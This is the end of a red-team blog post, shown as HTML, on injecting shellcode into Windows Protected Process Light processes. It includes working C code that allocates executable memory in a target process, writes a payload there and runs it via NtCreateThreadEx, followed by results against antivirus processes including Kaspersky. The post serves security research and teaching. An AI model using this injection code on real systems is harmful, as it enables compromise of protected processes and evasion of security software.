</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;ReadFile (for shellcode)&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Shellcode file read into buffer successfully (%lu bytes).</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwFileSize);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    hProcess <span style=color:#f92672>=</span> <span style=color:#a6e22e>OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>hProcess) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;OpenProcess&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    pRemoteBuffer <span style=color:#f92672>=</span> <span style=color:#a6e22e>VirtualAllocEx</span>(hProcess, NULL, dwFileSize, MEM_COMMIT <span style=color:#f92672>|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>pRemoteBuffer) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;VirtualAllocEx&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>WriteProcessMemory</span>(hProcess, pRemoteBuffer, pShellcodeBuffer, dwFileSize, NULL)) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogLastError</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;WriteProcessMemory&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Attempting to create remote thread via NtCreateThreadEx...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> <span style=color:#a6e22e>NtCreateThreadEx</span>(
</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>hThread,
</span></span><span style=display:flex><span>        THREAD_ALL_ACCESS,
</span></span><span style=display:flex><span>        NULL,
</span></span><span style=display:flex><span>        hProcess,
</span></span><span style=display:flex><span>        (LPTHREAD_START_ROUTINE)pRemoteBuffer,
</span></span><span style=display:flex><span>        NULL, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, NULL
</span></span><span style=display:flex><span>    );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (status <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[-] NtCreateThreadEx failed with NTSTATUS: 0x%X</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, status);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>goto</span> end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] NtCreateThreadEx appears to be successful, waiting for thread to finish...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>WaitForSingleObject</span>(hThread, INFINITE);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>GetExitCodeThread</span>(hThread, <span style=color:#f92672>&amp;</span>dwThreadExitCode);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>LogToConsole</span>(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;[*] Remote thread finished with exit code: 0x%X</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dwThreadExitCode);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    bReturnValue <span style=color:#f92672>=</span> TRUE;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>end:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hThread) <span style=color:#a6e22e>CloseHandle</span>(hThread);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pRemoteBuffer <span style=color:#f92672>&amp;&amp;</span> hProcess) <span style=color:#a6e22e>VirtualFreeEx</span>(hProcess, pRemoteBuffer, <span style=color:#ae81ff>0</span>, MEM_RELEASE);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hProcess) <span style=color:#a6e22e>CloseHandle</span>(hProcess);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (pShellcodeBuffer) <span style=color:#a6e22e>HeapFree</span>(<span style=color:#a6e22e>GetProcessHeap</span>(), <span style=color:#ae81ff>0</span>, pShellcodeBuffer);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (hFile) <span style=color:#a6e22e>CloseHandle</span>(hFile);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bReturnValue;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>This version of the function reads the shellcode from a binary file, allocates executable memory in the target PPL process, writes the shellcode to it, and finally executes it using <code>NtCreateThreadEx</code>. This approach circumvents the limitations of traditional <code>LoadLibrary</code> DLL injection in PPL contexts by leveraging a reflective, fileless injection strategy.</p><p>As a result, the entire injection process was successful, and the payload executed its intended behavior — creating a log file on the Desktop. However, it failed to output the expected debug message in Debug View. It is also possible that DbgView lacks the necessary privileges to receive messages from a process running at a higher protection level. In such cases, if the debugger is not properly attached or is isolated by sandboxing mechanisms, the message output may be silently rejected. This suggests that while the PPL process includes self-protection mechanisms, its sandbox is not overly strict with I/O operations, possibly because its functionality requires interaction with user interface components. This behavior can be observed in the figure below.</p><p><img src=/images/d070925/sucessSecHe.png alt=Line>
<em>Injection process was successful.</em></p><p>A similar attack was carried out against the <code>avp.exe</code> PPL process of Kaspersky. The result was a process exit with the error code <code>0xFF</code>, and several Kaspersky alert processes were triggered. Subsequently, the target <code>avp.exe</code> process was automatically relaunched with a new PID.</p><p>This was not merely a denial of the operation, but rather an active defensive response. Kaspersky&rsquo;s kernel-mode driver detected the anomalous behavior (a system PPL attempting to create a thread within <code>avp.exe</code>) and activated its <strong>Self-Protection and Self-Healing</strong> mechanisms.</p><p>Instead of simply blocking the action, Kaspersky initiated a response protocol: first, it terminated the compromised process to prevent further damage; then, it immediately restarted a clean instance of itself to maintain uninterrupted protection. This behavior is evident in the figure below.</p><p>However, we successfully injected a DLL into a PPL process, which is a noteworthy and commendable achievement.</p><p><img src=/images/d070925/failkas.png alt=Line>
<img src=/images/d070925/KasNotify.png alt=Line>
<em>Injection process failed.</em></p><hr><p><strong>You can find some related code in the blog post here: <a href=https://github.com/dangduongminhnhat/Process-Injection>https://github.com/dangduongminhnhat/Process-Injection</a></strong></p><h2 id=references>References</h2><ol><li>cocomelonc. (2021, September 09). <em>Classic DLL injection into the process. Simple C++ malware.</em>. Retrieved from <a href=https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html>https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html</a></li><li>Microsoft Ignite. (2022, September 02). <em>DllMain entry point</em>. Retrieved from <a href=https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain>https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain</a></li><li>Clément Labro. (2021, April 22). <em>Bypassing LSA Protection in Userland</em>. Retrieved from <a href=https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/>https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland/</a></li><li>itm4n. (2021, April 7). <em>Do You Really Know About LSA Protection (RunAsPPL)?</em>. Retrieved from <a href=https://itm4n.github.io/lsass-runasppl/>https://itm4n.github.io/lsass-runasppl/</a></li><li>gatari. (2025, February 28). <em>Long Live The Shellcode</em>. Retrieved from <a href=https://gatari.dev/posts/long-live-the-shellcode/>https://gatari.dev/posts/long-live-the-shellcode/</a></li><li>ired.team. <em>Reflective DLL Injection</em>. Retrieved from <a href=https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection>https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection</a></li></ol><h2 id=connect-with-me>Connect with Me</h2><p>Connect with me on <a href=https://www.facebook.com/dangduongminhnhat/>Facebook</a>, <a href=https://www.linkedin.com/in/nhatdang1901/>LinkedIn</a>, via email at <a href=mailto:dangduongminhnhat2003@gmail.com>dangduongminhnhat2003@gmail.com</a>, <a href=https://github.com/dangduongminhnhat>GitHub</a>, or by phone at <a href=tel:+84829258815>+84 829 258 815</a>.</p><div class=blog-tags><a href=https://dangduongminhnhat.github.io/tags/process-injection/>Process Injection</a>&nbsp;
<a href=https://dangduongminhnhat.github.io/tags/ppl/>PPL</a>&nbsp;
<a href=https://dangduongminhnhat.github.io/tags/red-team/>Red Team</a>&nbsp;
<a href=https://dangduongminhnhat.github.io/tags/windows-internals/>Windows Internals</a>&nbsp;
<a href=https://dangduongminhnhat.github.io/tags/dll-injection/>DLL Injection</a>&nbsp;
<a href=https://dangduongminhnhat.github.io/tags/cybersecurity/>CyberSecurity</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://dangduongminhnhat.github.io/posts/d020725/session-hijacking/ data-toggle=tooltip data-placement=top title="Session Hijacking: Transferring Chrome Cookies and Bypassing Two-Factor Authentication (2FA)">&larr; Previous Post</a></li></ul><div id=utterances-comments><script src=https://utteranc.es/client.js repo=dangduongminhnhat/dangduongminhnhat.github.io issue-term=pathname theme=github-light crossorigin=anonymous async></script></div></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"></ul><p class="credits copyright text-muted">&nbsp;&bull;&nbsp;&copy;
2025
&nbsp;&bull;&nbsp;
<a href=https://dangduongminhnhat.github.io/>Daminha Blog</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.129.0</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js integrity=sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t crossorigin=anonymous></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js integrity=sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05 crossorigin=anonymous onload=renderMathInElement(document.body)></script><script src=https://code.jquery.com/jquery-3.7.0.slim.min.js integrity=sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js integrity=sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd crossorigin=anonymous></script><script src=https://dangduongminhnhat.github.io/js/main.js></script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://dangduongminhnhat.github.io/js/load-photoswipe.js></script></body></html>